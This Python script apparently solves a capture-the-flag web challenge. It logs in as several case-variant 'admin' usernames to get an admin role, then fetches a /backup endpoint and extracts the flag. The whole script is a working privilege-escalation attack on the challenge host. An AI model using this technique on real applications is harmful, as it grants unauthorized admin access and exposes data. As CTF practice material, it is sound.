import requests
import re

BASE_URL = "http://8080-f38af472-f3ae-405c-9d07-9ac048a61efd.challenge.ctfplus.cn"
session = requests.Session()

print("[*] Flask 备份接口漏洞 - 真正的尝试")
print(f"[*] Target: {BASE_URL}")
print()

# 测试所有已注册的变体
test_uids = [
    ("3553c1effa0b4698895a4874cfbd86d8", "ADMiN"),
    ("eb0ffb79891641d789c50970f64aa263", "aDMin"),
    ("3dd115d18aaa4802b50f2a1465c1d262", "admiN"),
    ("7be64fb8e16e4ce68ea27229602da4f9", "ADMin"),
    ("2a4b09719fac43a4b0b30e113dd8922d", "admIn"),
    ("05a4d4515bdf4d20b8017b7daacbb4d2", "adMin"),
    ("87a1436affe74e3f97deca19403c03a3", "aDmin"),
    ("22ff95cf5e4240ebb26a010e9411bc3f", "ADMIn"),
    ("398ca74e65d14d47a4bb1af99c8b6507", "aDMIN"),
]

for uid, username in test_uids:
    print(f"\n[-] 测试 {username} (UID: {uid})")
    
    # POST 登录
    login_resp = session.post(f"{BASE_URL}/login", data={"uid": uid})
    print(f"    POST /login: {login_resp.status_code}")
    
    # 调用 /api/profile 检查角色
    profile_resp = session.post(f"{BASE_URL}/api/profile", 
        json={"uid": uid},
        headers={"Content-Type": "application/json"})
    print(f"    POST /api/profile: {profile_resp.status_code}")
    print(f"    Response: {profile_resp.text}")
    
    # 检查是否是管理员
    if '"role":"admin"' in profile_resp.text or '"admin"' in profile_resp.text:
        print(f"    [!!!] 找到管理员角色!")
        
        # 尝试访问备份
        backup_resp = session.get(f"{BASE_URL}/backup")
        print(f"    GET /backup: {backup_resp.status_code}")
        
        if backup_resp.status_code != 404:
            print(f"    [!!!] 备份可访问!")
            print(f"    {backup_resp.text}")
            
            if "flag" in backup_resp.text.lower():
                print(f"    [!!!] 发现 flag!")
                flag_match = re.search(r'flag\{[^}]+\}', backup_resp.text, re.IGNORECASE)
                if flag_match:
                    print(f"    [!!!] Flag: {flag_match.group()}")
            break

print()
print("[*] 测试完成")
